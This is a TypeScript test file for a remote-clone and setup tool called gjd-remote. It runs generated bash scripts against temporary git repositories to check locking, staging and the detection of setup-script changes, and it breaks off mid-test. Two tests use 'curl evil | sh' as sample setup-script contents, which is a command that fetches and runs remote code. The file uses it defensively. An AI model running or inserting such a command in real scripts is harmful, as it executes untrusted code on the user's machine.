/**
 * The decisions `gjd-remote` makes about clones, configs and setup runs.
 *
 * Every test here exists because GPT Sol's Stage 2 review
 * (docs/plans/260902h-…-stage2-review-sol.md) found the code it covers
 * unreachable from any test: `cloneIntoPlace`, `sweepStaging`,
 * `authoritativeConfig`, `setupGate` and the box-read protocol all lived in
 * `scripts/gjd-remote.ts`, which calls `main()` on import. They are in
 * `scripts/gjd-remote-flow.ts` now, and this file is the reddening.
 *
 * **The shell is RUN, not read.** `checkoutProbeScript` and
 * `cloneTransactionScript` are executed under this laptop's bash, against real
 * temporary git repositories, exactly as the box would run them. Asserting on
 * the text of a generated script proves the text; running it proves the script.
 *
 * `flock` is not on macOS, and the transaction refuses without it — correctly,
 * because there is no serialising to be had. So these tests put a **fake
 * `flock` on PATH**: one that grants and one that refuses. What is under test
 * is which branch we take on the lock's answer, not the kernel's locking, and
 * a fake makes the "another clone is running" branch reachable at all.
 */
import { execFileSync } from "node:child_process";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parseRepoConfig } from "../scripts/gjd-remote-config.js";
import {
  BOX_END,
  BOX_ERR,
  BOX_OK,
  type LockState,
  type SetupSpec,
  boxConfigScript,
  checkoutProbeScript,
  cloneTransactionScript,
  decodeBoxField,
  describeSpec,
  diffSetupSpec,
  foundGateDecision,
  needsTerminalSetupRecord,
  parseBoxRead,
  parseBoxConfig,
  parseCheckoutProbe,
  parseCloneTransaction,
  parseAdmission,
  sessionAdmissionScript,
  setupFingerprint,
  setupGateDecision,
  setupReadScript,
  setupSpec,
  sha256,
} from "../scripts/gjd-remote-flow.js";
import { setupConfigSha256 } from "../scripts/gjd-remote-setup.js";
import type { SetupVerdict } from "../scripts/gjd-remote-setup.js";

// ------------------------------------------------------------------ fixtures

let root: string;

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: {
      ...process.env,
      GIT_CONFIG_GLOBAL: join(root, "gitconfig"),
      GIT_CONFIG_SYSTEM: "/dev/null",
      GIT_AUTHOR_NAME: "T",
      GIT_AUTHOR_EMAIL: "t@example.com",
      GIT_COMMITTER_NAME: "T",
      GIT_COMMITTER_EMAIL: "t@example.com",
    },
  });
}

/** A repo with one commit, at `<root>/<where>`, and its origin if given. */
function makeRepo(where: string, origin?: string): string {
  const dir = join(root, where);
  mkdirSync(dir, { recursive: true });
  git(dir, "init", "-q", "-b", "main");
  writeFileSync(join(dir, "README.md"), "hello\n");
  git(dir, "add", "README.md");
  git(dir, "commit", "-qm", "first");
  if (origin) git(dir, "remote", "add", "origin", origin);
  return dir;
}

/**
 * A `flock` on PATH that always grants (`grant`) or always refuses (`busy`).
 * Returned as the PATH prefix to run the script with.
 */
function fakeFlock(kind: "grant" | "busy"): string {
  const bin = join(root, `bin-${kind}`);
  mkdirSync(bin, { recursive: true });
  const file = join(bin, "flock");
  writeFileSync(file, `#!/bin/sh\nexit ${kind === "grant" ? 0 : 1}\n`);
  chmodSync(file, 0o755);
  return bin;
}

/** Run a generated box script under bash, the way the box would. */
function run(script: string, opts: { path?: string } = {}): string {
  return execFileSync("bash", ["-c", script], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: {
      ...process.env,
      ...(opts.path === undefined ? {} : { PATH: `${opts.path}:${process.env.PATH ?? ""}` }),
      GIT_CONFIG_GLOBAL: join(root, "gitconfig"),
      GIT_CONFIG_SYSTEM: "/dev/null",
      GIT_AUTHOR_NAME: "T",
      GIT_AUTHOR_EMAIL: "t@example.com",
      GIT_COMMITTER_NAME: "T",
      GIT_COMMITTER_EMAIL: "t@example.com",
    },
  });
}

beforeEach(() => {
  // realpathSync because /tmp is a symlink to /private/tmp on macOS, and the
  // scripts compare `pwd -P` against what git reports.
  root = realpathSync(mkdtempSync(join(tmpdir(), "gjd-remote-flow-")));
  writeFileSync(join(root, "gitconfig"), "[init]\n\tdefaultBranch = main\n");
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

// ------------------------------------------------------- the box-read protocol

describe("parseBoxRead", () => {
  const whole = [BOX_OK, "a 1", "b two words", BOX_END, ""].join("\n");

  it("reads a whole reply", () => {
    const got = parseBoxRead(whole, ["a", "b"]);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.fields.get("a")).toBe("1");
    expect(got.fields.get("b")).toBe("two words");
  });

  /**
   * GPT Sol's Stage 2 finding 5, and the reason `BOX_END` exists at all: a
   * reply cut after its last field is byte-for-byte a complete one. Without the
   * terminal sentinel this input parses, and every field in it is right.
   */
  it("refuses a reply cut off after its last field", () => {
    const cut = [BOX_OK, "a 1", "b two words"].join("\n");
    const got = parseBoxRead(cut, ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("cut short");
  });

  it("refuses anything after the end sentinel", () => {
    const got = parseBoxRead(`${whole}\nb three\n`, ["a", "b"]);
    expect(got.ok).toBe(false);
  });

  it("refuses a field said twice, rather than choosing one", () => {
    const got = parseBoxRead([BOX_OK, "a 1", "a 2", "b x", BOX_END].join("\n"), ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("two 'a' lines");
  });

  it("refuses a line nobody asked for", () => {
    const got = parseBoxRead([BOX_OK, "a 1", "b x", "c surprise", BOX_END].join("\n"), ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("'c'");
  });

  it("refuses a missing field by name", () => {
    const got = parseBoxRead([BOX_OK, "a 1", BOX_END].join("\n"), ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("b");
  });

  it("hands back the box's own refusal, wherever it appears", () => {
    const got = parseBoxRead([BOX_OK, "a 1", `${BOX_ERR} git is not on this box`].join("\n"), ["a"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toBe("git is not on this box");
  });

  it("refuses a reply that never started", () => {
    expect(parseBoxRead("bash: something went wrong\n", ["a"]).ok).toBe(false);
  });
});

describe("decodeBoxField", () => {
  it("round-trips text", () => {
    const b64 = Buffer.from("a path with spaces/and-a-|", "utf8").toString("base64");
    const got = decodeBoxField(b64, "x");
    expect(got.ok && got.text).toBe("a path with spaces/and-a-|");
  });

  it("refuses base64 that was cut in half", () => {
    const b64 = Buffer.from("a reasonably long value here", "utf8").toString("base64");
    expect(decodeBoxField(b64.slice(0, -6), "x").ok).toBe(false);
  });
});

// -------------------------------------------------------------- checkout probe

describe("checkoutProbeScript, run for real", () => {
  it("reads a checkout: origin, HEAD, branch, subject and the .git inode", () => {
    const dir = makeRepo("repo", "https://github.com/gregdetre/gjdutils.git");
    const got = parseCheckoutProbe(run(checkoutProbeScript(dir)));
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.probe.exists).toBe(true);
    expect(got.probe.isCheckout).toBe(true);
    expect(got.probe.isSymlink).toBe(false);
    expect(got.probe.origin).toBe("https://github.com/gregdetre/gjdutils.git");
    expect(got.probe.head).toMatch(/^[0-9a-f]{40}$/);
    expect(got.probe.branch).toBe("main");
    expect(got.probe.subject).toBe("first");
    expect(got.probe.gitInode).toMatch(/^[0-9]+$/);
  });

  it("says a plain directory is not a checkout, and has no inode", () => {
    mkdirSync(join(root, "plain"));
    const got = parseCheckoutProbe(run(checkoutProbeScript(join(root, "plain"))));
    expect(got.ok && got.probe.exists).toBe(true);
    expect(got.ok && got.probe.isCheckout).toBe(false);
    expect(got.ok && got.probe.gitInode).toBeUndefined();
  });

  it("says a missing path does not exist", () => {
    const got = parseCheckoutProbe(run(checkoutProbeScript(join(root, "nope"))));
    expect(got.ok && got.probe.exists).toBe(false);
  });

  it("reports a symlink as one, even when it points at a checkout", () => {
    const real = makeRepo("target", "https://github.com/gregdetre/gjdutils.git");
    symlinkSync(real, join(root, "link"));
    const got = parseCheckoutProbe(run(checkoutProbeScript(join(root, "link"))));
    expect(got.ok && got.probe.isSymlink).toBe(true);
    expect(got.ok && got.probe.exists).toBe(true);
  });

  /** An interrupted clone: a `.git` with no commit. It is a checkout and it has
   *  no HEAD, and that difference is the whole of `blocked: incomplete-checkout`. */
  it("reports a checkout whose HEAD does not resolve", () => {
    const dir = join(root, "half");
    mkdirSync(dir, { recursive: true });
    git(dir, "init", "-q", "-b", "main");
    const got = parseCheckoutProbe(run(checkoutProbeScript(dir)));
    expect(got.ok && got.probe.isCheckout).toBe(true);
    expect(got.ok && got.probe.head).toBeUndefined();
  });

  it("survives a directory name with a space and a pipe in it", () => {
    const dir = makeRepo("odd name|here", "https://github.com/gregdetre/gjdutils.git");
    const got = parseCheckoutProbe(run(checkoutProbeScript(dir)));
    expect(got.ok && got.probe.realpath).toBe(dir);
  });
});

// ---------------------------------------------------------- clone transaction

describe("cloneTransactionScript, run for real", () => {
  /** A bare repo to clone from, and the `file://` URL git will record. */
  function upstream(): { url: string } {
    const src = makeRepo("upstream-work");
    const bare = join(root, "upstream.git");
    execFileSync("git", ["clone", "-q", "--bare", src, bare], { stdio: ["ignore", "pipe", "pipe"] });
    return { url: `file://${bare}` };
  }

  function transaction(o: { dest: string; staging: string; url: string; statusPath?: string; between?: string }): string {
    return cloneTransactionScript({
      dest: o.dest,
      staging: o.staging,
      lockPath: join(root, "locks", "clone-x.lock"),
      locksDir: join(root, "locks"),
      url: o.url,
      statusPath: o.statusPath ?? join(root, "setup", "owner--name.json"),
      ...(o.between === undefined ? {} : { between: o.between }),
    });
  }

  it("clones, verifies and moves into place, and reports the new .git inode", () => {
    const { url } = upstream();
    const dest = join(root, "code", "thing");
    const out = run(transaction({ dest, staging: join(root, "code", ".gjd-remote-staging-thing-1"), url }), {
      path: fakeFlock("grant"),
    });
    const got = parseCloneTransaction(out);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.outcome.kind).toBe("ok");
    if (got.outcome.kind !== "ok") return;
    expect(got.outcome.origin).toBe(url);
    expect(got.outcome.head).toMatch(/^[0-9a-f]{40}$/);
    expect(got.outcome.stale).toBe("none");
    // The destination IS the tree that was verified, not merely a tree.
    const after = parseCheckoutProbe(run(checkoutProbeScript(dest)));
    expect(after.ok && after.probe.gitInode).toBe(got.outcome.inode);
  });

  /**
   * GPT Sol's Stage 2 finding 1. The old code asked the box whether the
   * destination existed, and moved into it several seconds later.
   */
  it("refuses when the destination appeared while we were not looking", () => {
    const { url } = upstream();
    const dest = join(root, "code", "thing");
    mkdirSync(dest, { recursive: true });
    writeFileSync(join(dest, "somebody-elses-work.txt"), "mine\n");
    const got = parseCloneTransaction(
      run(transaction({ dest, staging: join(root, "code", ".gjd-remote-staging-thing-2"), url }), { path: fakeFlock("grant") }),
    );
    expect(got.ok && got.outcome.kind).toBe("taken");
    expect(execFileSync("cat", [join(dest, "somebody-elses-work.txt")], { encoding: "utf8" })).toBe("mine\n");
  });

  /**
   * GPT Sol's Stage 2 finding 2, and the one that matters most: the old
   * `sweepStaging` would `rm -rf` a directory it had not created, because its
   * only guard was the pathname. Reserving the name with `mkdir` makes that
   * unreachable — the transaction never gets past the reservation.
   */
  it("never touches a directory it did not create at the staging name", () => {
    const { url } = upstream();
    const staging = join(root, "code", ".gjd-remote-staging-thing-3");
    mkdirSync(staging, { recursive: true });
    writeFileSync(join(staging, "precious.txt"), "not ours\n");
    const got = parseCloneTransaction(
      run(transaction({ dest: join(root, "code", "thing"), staging, url }), { path: fakeFlock("grant") }),
    );
    expect(got.ok && got.outcome.kind).toBe("staging-taken");
    expect(execFileSync("cat", [join(staging, "precious.txt")], { encoding: "utf8" })).toBe("not ours\n");
  });

  it("sweeps only the empty directory it reserved when git fails", () => {
    const staging = join(root, "code", ".gjd-remote-staging-thing-4");
    const got = parseCloneTransaction(
      run(transaction({ dest: join(root, "code", "thing"), staging, url: `file://${join(root, "no-such-repo.git")}` }), {
        path: fakeFlock("grant"),
      }),
    );
    expect(got.ok).toBe(true);
    if (!got.ok || got.outcome.kind !== "clone-failed") throw new Error(`got ${JSON.stringify(got)}`);
    expect(got.outcome.swept).toBe("removed");
    expect(got.outcome.code).not.toBe("0");
    expect(existsSync(staging)).toBe(false);
  });

  /**
   * GPT Sol's Stage 3 finding 7c. The test above leaves an EMPTY directory
   * behind, so `rmdir` and a hypothetical `rm -rf` are indistinguishable in it —
   * it is green whichever the script uses. This one makes git leave a partial
   * tree, which is what a clone interrupted on the box actually leaves, and
   * asserts it survives: crash evidence is the only thing anybody has to look
   * at afterwards.
   *
   * A fake `git` on PATH rather than a real interrupted clone, because "git
   * fails after creating some of the tree" is not a state a test can produce on
   * demand — and a race is a test that passes for the wrong reason on a slow
   * machine.
   */
  it("keeps a half-made tree when git fails after creating some of it", () => {
    const bin = join(root, "bin-partial-git");
    mkdirSync(bin, { recursive: true });
    // $1 clone, $2 url, $3 staging — the transaction's own call shape.
    writeFileSync(join(bin, "git"), `#!/bin/sh\nmkdir -p "$3/.git" && printf 'half\\n' > "$3/.git/config"\nexit 128\n`);
    chmodSync(join(bin, "git"), 0o755);
    const staging = join(root, "code", ".gjd-remote-staging-thing-4b");
    const got = parseCloneTransaction(
      run(transaction({ dest: join(root, "code", "thing"), staging, url: "file:///nowhere.git" }), {
        path: `${fakeFlock("grant")}:${bin}`,
      }),
    );
    if (!got.ok || got.outcome.kind !== "clone-failed") throw new Error(`got ${JSON.stringify(got)}`);
    expect(got.outcome.swept).toBe("kept");
    expect(got.outcome.code).toBe("128");
    expect(readFileSync(join(staging, ".git", "config"), "utf8")).toBe("half\n");
  });

  /**
   * GPT Sol's Stage 3 finding 7b. The "destination appeared while we were not
   * looking" test above creates the destination BEFORE the script starts, so it
   * exercises the locked re-check and would pass with no `mv -n` and no inode
   * comparison at all. The window that matters is between that re-check and the
   * rename, and `between` is the only way to open it from outside.
   */
  it("refuses when the destination appears AFTER the locked re-check", () => {
    const { url } = upstream();
    const dest = join(root, "code", "thing");
    const staging = join(root, "code", ".gjd-remote-staging-thing-race");
    const got = parseCloneTransaction(
      run(
        transaction({
          dest,
          staging,
          url,
          between: `mkdir -p ${dest} && printf 'mine\\n' > ${dest}/somebody-elses-work.txt`,
        }),
        { path: fakeFlock("grant") },
      ),
    );
    if (!got.ok) throw new Error(`got ${JSON.stringify(got)}`);
    // Either the rename refused (GNU `mv -n`/`-T`) or it moved INTO the
    // directory and the inode comparison caught it (a weaker `mv`). Both are
    // refusals, and which one you get is the platform's business — what must
    // never happen is `ok`.
    expect(["move-failed", "move-declined"]).toContain(got.outcome.kind);
    expect(readFileSync(join(dest, "somebody-elses-work.txt"), "utf8")).toBe("mine\n");
  });

  /**
   * The inode comparison's own mutation sentinel — Sol's Stage 3 finding 7e.
   * The comment on it says `mv -n` can decline and still exit 0 on some
   * coreutils, and nothing reddened that claim: on this machine `mv` never
   * declines silently, so the comparison could be deleted and every test would
   * stay green. A fake `mv` that exits 0 and moves nothing IS that coreutils.
   */
  it("catches an mv that exits 0 and moved nothing", () => {
    const { url } = upstream();
    const bin = join(root, "bin-lying-mv");
    mkdirSync(bin, { recursive: true });
    writeFileSync(join(bin, "mv"), "#!/bin/sh\nexit 0\n");
    chmodSync(join(bin, "mv"), 0o755);
    const dest = join(root, "code", "thing");
    const staging = join(root, "code", ".gjd-remote-staging-thing-lying");
    const got = parseCloneTransaction(
      run(transaction({ dest, staging, url }), { path: `${fakeFlock("grant")}:${bin}` }),
    );
    if (!got.ok || got.outcome.kind !== "move-declined") throw new Error(`got ${JSON.stringify(got)}`);
    expect(got.outcome.before).toMatch(/^[0-9]+$/);
    expect(got.outcome.after).toBe("");
    expect(existsSync(dest)).toBe(false);
  });

  it("says a refusal is a refusal, so nothing is sent to look at paths that were never made", () => {
    const got = parseCloneTransaction(`${BOX_ERR} another clone of that destination is running on the box right now\n`);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.refused).toBe(true);
    // A reply that started and stopped is NOT a refusal: something may have
    // happened, and the caller has to name both paths.
    const cut = parseCloneTransaction([BOX_OK, "step ok", "inode 12"].join("\n"));
    expect(cut.ok === false && cut.refused).toBe(false);
  });

  /**
   * GPT Sol's Stage 3 finding 7a: the old version of this test asserted only
   * the refusal sentence, which the script prints before it touches anything —
   * so it was green for a script that went on to clone anyway. What a refusal
   * MEANS is that nothing happened, and that is three assertions, one per thing
   * the transaction can create.
   */
  it("refuses outright when another clone holds the lock, and creates nothing", () => {
    const { url } = upstream();
    const dest = join(root, "code", "thing");
    const staging = join(root, "code", ".gjd-remote-staging-thing-5");
    const statusPath = join(root, "setup", "owner--name.json");
    mkdirSync(join(root, "setup"), { recursive: true });
    writeFileSync(statusPath, '{"outcome":"success"}\n');

    const got = parseCloneTransaction(
      run(transaction({ dest, staging, url, statusPath }), { path: fakeFlock("busy") }),
    );
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("another clone");
    expect(got.refused).toBe(true);
    expect(existsSync(dest), "the destination was created behind a held lock").toBe(false);
    expect(existsSync(staging), "a staging directory was reserved behind a held lock").toBe(false);
    // The status file is neither archived nor removed: archiving is a
    // consequence of a clone that happened, and none did.
    expect(readFileSync(statusPath, "utf8")).toBe('{"outcome":"success"}\n');
    expect(readdirSync(join(root, "setup"))).toEqual(["owner--name.json"]);
  });

  /**
   * GPT Sol's Stage 2 finding 7, the CLI half: delete a checkout, clone it
   * again at the same path, and the old success still names that slug and that
   * directory. It is archived rather than deleted — it is the only record of
   * what was there.
   */
  it("archives a setup status left over from the checkout that used to be here", () => {
    const { url } = upstream();
    const statusPath = join(root, "setup", "owner--name.json");
    mkdirSync(join(root, "setup"), { recursive: true });
    const was = '{"outcome":"success","note":"the tree that used to be here"}\n';
    writeFileSync(statusPath, was);
    const got = parseCloneTransaction(
      run(
        transaction({
          dest: join(root, "code", "thing"),
          staging: join(root, "code", ".gjd-remote-staging-thing-6"),
          url,
          statusPath,
        }),
        { path: fakeFlock("grant") },
      ),
    );
    expect(got.ok && got.outcome.kind === "ok" && got.outcome.stale).toBe("archived");
    expect(existsSync(statusPath)).toBe(false);
    // ARCHIVED, not deleted — Sol's Stage 3 finding 7d. The old assertion was
    // that the path had gone, which `rm` satisfies just as well as `mv`, and
    // this file is the only record of what that checkout once was.
    const kept = readdirSync(join(root, "setup"));
    expect(kept).toHaveLength(1);
    const first = kept[0];
    if (first === undefined) throw new Error("nothing was kept");
    expect(first).toMatch(/^owner--name\.json\.stale-\d{8}T\d{6}Z$/);
    expect(readFileSync(join(root, "setup", first), "utf8")).toBe(was);
  });

  /**
   * GPT Sol's Stage 3 finding 3, the clone half. The checkout is in place and
   * good; the previous checkout's verdict could not be moved aside and is still
   * sitting at the path every later run reads. That used to be a yellow line
   * and the clone carried on into setup, so a session could be admitted on a
   * success about a tree that no longer exists.
   *
   * The status directory is made read-only, which is what `mv` out of it needs
   * and what nothing else in the transaction touches.
   */
  it("FAILS the transaction when the old setup status cannot be moved aside", () => {
    const { url } = upstream();
    const setupDir = join(root, "setup-locked");
    const statusPath = join(setupDir, "owner--name.json");
    mkdirSync(setupDir, { recursive: true });
    writeFileSync(statusPath, '{"outcome":"success"}\n');
    chmodSync(setupDir, 0o500);
    try {
      const got = parseCloneTransaction(
        run(
          transaction({
            dest: join(root, "code", "thing"),
            staging: join(root, "code", ".gjd-remote-staging-thing-stuck"),
            url,
            statusPath,
          }),
          { path: fakeFlock("grant") },
        ),
      );
      if (!got.ok) throw new Error(`got ${JSON.stringify(got)}`);
      expect(got.outcome.kind).toBe("stale-stuck");
      if (got.outcome.kind !== "stale-stuck") return;
      // The checkout IS there and IS the verified tree — the transaction did
      // its job and then found it could not finish tidying, which is why this
      // is its own arm rather than a failure of the clone.
      expect(got.outcome.inode).toMatch(/^[0-9]+$/);
      expect(got.outcome.origin).toBe(url);
      expect(existsSync(join(root, "code", "thing", ".git"))).toBe(true);
      // And the thing that makes it unsafe is still there, for the caller to name.
      expect(readFileSync(statusPath, "utf8")).toBe('{"outcome":"success"}\n');
    } finally {
      chmodSync(setupDir, 0o755);
    }
  });

  /**
   * The clone exits 0 and what it made has no commit — an empty upstream here,
   * an interrupted clone on the box. Verified BEFORE the move, so the
   * destination never exists at all rather than existing half-made.
   */
  it("refuses to move a tree whose HEAD does not resolve, and leaves no destination", () => {
    const empty = join(root, "empty.git");
    execFileSync("git", ["init", "-q", "--bare", "-b", "main", empty], { stdio: ["ignore", "pipe", "pipe"] });
    const dest = join(root, "code", "thing");
    const got = parseCloneTransaction(
      run(
        transaction({ dest, staging: join(root, "code", ".gjd-remote-staging-thing-7"), url: `file://${empty}` }),
        { path: fakeFlock("grant") },
      ),
    );
    expect(got.ok).toBe(true);
    if (!got.ok || got.outcome.kind !== "verify-failed") throw new Error(`got ${JSON.stringify(got)}`);
    expect(got.outcome.why).toBe("no-head");
    const at = parseCheckoutProbe(run(checkoutProbeScript(dest)));
    expect(at.ok && at.probe.exists).toBe(false);
  });
});

describe("parseCloneTransaction", () => {
  it("refuses a reply that stops after the step line", () => {
    const got = parseCloneTransaction([BOX_OK, "step ok", "inode 12"].join("\n"));
    expect(got.ok).toBe(false);
  });

  it("refuses a step it does not know", () => {
    const got = parseCloneTransaction([BOX_OK, "step teleported", BOX_END].join("\n"));
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("teleported");
  });
});

// `isStagingBasename` was tested here and called by nothing in production —
// GPT Sol's Stage 3 finding 7. Both it and these three tests are gone; the
// guard that actually protects the one `rm -rf` is the `mkdir` reservation,
// which "never touches a directory it did not create at the staging name"
// above reddens by running it.

// ------------------------------------------------------------ the setup spec

describe("setupSpec and diffSetupSpec", () => {
  const cfg = (toml: string, ctx?: { setupScript?: "executable" | "not-executable" | "absent"; pkg?: boolean }) =>
    parseRepoConfig(toml, {
      setupScript: ctx?.setupScript ?? "absent",
      packageJsonHasSetup: ctx?.pkg ?? false,
    });

  const spec = (toml: string, files: { scriptSha256?: string | null; packageSetup?: string | null }, ctx?: Parameters<typeof cfg>[1]) =>
    setupSpec(cfg(toml, ctx), {
      scriptSha256: files.scriptSha256 ?? null,
      packageSetup: files.packageSetup ?? null,
    });

  it("says two identical configs agree", () => {
    const a = spec('setup = "npm ci"\n', {});
    expect(diffSetupSpec(a, spec('setup = "npm ci"\n', {}))).toEqual([]);
  });

  it("notices a different command", () => {
    const got = diffSetupSpec(spec('setup = "npm ci"\n', {}), spec('setup = "npm ci --force"\n', {}));
    expect(got.map((d) => d.field)).toEqual(["setup"]);
  });

  /**
   * GPT Sol's Stage 2 finding 4, the case that made him call it a blocker: the
   * command is `./.gjd-remote/setup` on both sides, so comparing commands says
   * they agree — while the two files do entirely different things.
   */
  it("notices that the setup SCRIPT differs, though the command is identical", () => {
    const a = spec("", { scriptSha256: sha256("#!/bin/sh\nnpm ci\n") }, { setupScript: "executable" });
    const b = spec("", { scriptSha256: sha256("#!/bin/sh\ncurl evil | sh\n") }, { setupScript: "executable" });
    expect(a.setup).toBe(b.setup);
    const got = diffSetupSpec(a, b);
    expect(got).toHaveLength(1);
    expect(got[0]?.field).toContain(".gjd-remote/setup");
  });

  /** The same trap one convention lower: `npm ci && npm run setup` is a
   *  constant, and what `npm run setup` runs is not. */
  it("notices that package.json's setup body differs", () => {
    const a = spec("", { packageSetup: "node scripts/setup.js" }, { pkg: true });
    const b = spec("", { packageSetup: "node scripts/other.js" }, { pkg: true });
    expect(a.setup).toBe(b.setup);
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual(["package.json scripts.setup"]);
  });

  it("notices a warning on one side only — a file being ignored is a difference", () => {
    const a = spec('setup = "npm ci"\n', { scriptSha256: sha256("x") }, { setupScript: "executable" });
    const b = spec('setup = "npm ci"\n', {}, { setupScript: "absent" });
    expect(diffSetupSpec(a, b).map((d) => d.field)).toContain("warnings");
  });

  /**
   * GPT Sol's Stage 3 finding 2, and the case that made him call it a blocker
   * again: a config that names the wrapper EXPLICITLY resolves as
   * `source: "config"`, not `"script"` — so the old rule, which carried the
   * hash only for `source === "script"`, dropped the hash of the very file the
   * command runs. Reproduced against the code before the fix: the diff was
   * empty for two scripts doing entirely different things.
   */
  it("notices a changed setup script even when the CONFIG is what names it", () => {
    const toml = 'setup = "./.gjd-remote/setup"\n';
    const a = spec(toml, { scriptSha256: sha256("#!/bin/sh\nnpm ci\n") }, { setupScript: "executable" });
    const b = spec(toml, { scriptSha256: sha256("#!/bin/sh\ncurl evil | sh\n") }, { setupScript: "executable" });
    expect(a.source).toBe("config");
    expect(a.setup).toBe(b.setup);
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual([".gjd-remote/setup contents"]);
    expect(setupFingerprint(a)).not.toBe(setupFingerprint(b));
  });

  /** The same trap on the other convention: `npm ci && npm run setup` spelled
   *  out in the config is still `source: "config"`, and what `npm run setup`
   *  runs is still not in the command. */
  it("notices a changed package.json body even when the CONFIG is what names the wrapper", () => {
    const toml = 'setup = "npm ci && npm run setup"\n';
    const a = spec(toml, { packageSetup: "node scripts/setup.js" }, { pkg: true });
    const b = spec(toml, { packageSetup: "node scripts/other.js" }, { pkg: true });
    expect(a.source).toBe("config");
    expect(a.setup).toBe(b.setup);
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual(["package.json scripts.setup"]);
    expect(setupFingerprint(a)).not.toBe(setupFingerprint(b));
  });

  /**
   * The cost of carrying both facts unconditionally, asserted rather than
   * hoped: a script nothing runs still counts as a difference. This test used
   * to assert the opposite, and the opposite is what let the two cases above
   * through — a rule that decides which inputs matter from `source` is a rule
   * that has to be right about `source` in every configuration, and it was not.
   * Being too strict costs one `gjd-remote setup`; being too loose costs a
   * session in a tree set up by a script nobody agreed to.
   */
  it("counts an ignored setup script as a difference, because deciding otherwise needs source to be right", () => {
    const a = spec('setup = "npm ci"\n', { scriptSha256: sha256("one") }, { setupScript: "not-executable" });
    const b = spec('setup = "npm ci"\n', { scriptSha256: sha256("two") }, { setupScript: "not-executable" });
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual([".gjd-remote/setup contents"]);
  });

  it("notices a check that only one side has", () => {
    const a = spec('setup = "npm ci"\ncheck = "npm run doctor"\n', {});
    const b = spec('setup = "npm ci"\n', {});
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual(["check"]);
  });

  it("describes what would run, with the script's hash when that is what runs", () => {
    const s = spec("", { scriptSha256: sha256("#!/bin/sh\n") }, { setupScript: "executable" });
    expect(describeSpec(s)).toContain("script");
    expect(describeSpec(s)).toContain("sha ");
    expect(describeSpec(spec("", {}))).toBe("(none known)");
  });

  /**
   * The fingerprint has to move whenever ANY execution input does, because it
   * is what the durable status carries and what the locked job re-checks. One
   * field at a time, so a fingerprint that quietly stopped reading one of them
   * fails on that field's row rather than passing five of six.
   */
  it("moves for every execution input, one at a time", () => {
    const base = spec('setup = "npm ci"\ncheck = "npm run doctor"\n', {
      scriptSha256: sha256("one"),
      packageSetup: "node a.js",
    });
    const rows: [string, SetupSpec][] = [
      ["setup", spec('setup = "npm ci --force"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" })],
      ["check", spec('setup = "npm ci"\ncheck = "npm run other"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" })],
      ["script", spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("two"), packageSetup: "node a.js" })],
      ["package", spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node b.js" })],
      [
        "warnings",
        spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" }, { setupScript: "executable" }),
      ],
    ];
    for (const [what, other] of rows) {
      expect(setupFingerprint(other), `${what} did not move the fingerprint`).not.toBe(setupFingerprint(base));
    }
    // And it is stable: the same inputs twice are the same hash, or every
    // second run would be `config-changed`.
    expect(setupFingerprint(spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" }))).toBe(
      setupFingerprint(base),
    );
  });

  it("never collides with the command-only hash it replaces", () => {
    // Both are sha256 of a JSON literal, and only `v` keeps them apart.
    const s = spec('setup = "npm ci"\n', {});
    expect(setupFingerprint(s)).not.toBe(setupConfigSha256("npm ci", undefined));
  });
});

// ------------------------------------------------------------------ the gates

const verdicts: Record<string, SetupVerdict> = {
  "never-run": { kind: "never-run", why: "nothing has ever set it up", remedy: "gjd-remote setup" },
  "config-changed": { kind: "config-changed", why: "the config changed", remedy: "gjd-remote setup" },
  failed: { kind: "failed", why: "it failed", remedy: "gjd-remote setup", exitCode: 3, checkFailed: false },
  "in-progress": {
    kind: "in-progress",
    why: "a setup attempt started",
    remedy: "gjd-remote ls",
    attempt: "a1",
    startedAt: "2026-09-02T00:00:00Z",
  },
  success: { kind: "success", why: "set up on attempt a1", remedy: null },
  "wrong-checkout": {
    kind: "wrong-checkout",
    why: "that status is about another checkout",
    remedy: "gjd-remote setup",
    field: "inode",
    found: "1",
    wanted: "2",
  },
};

describe("setupGateDecision", () => {
  const decide = (v: string, lock: LockState, force = false) =>
    setupGateDecision(verdicts[v] as SetupVerdict, lock, force).kind;

  it("starts a run for every not-ready verdict when the lock is free", () => {
    for (const v of ["never-run", "config-changed", "failed", "wrong-checkout"]) {
      expect(decide(v, "free")).toBe("start");
      expect(decide(v, "none")).toBe("start");
    }
  });

  it("calls a success already ready, and runs it again only for --force", () => {
    expect(decide("success", "free")).toBe("already-ready");
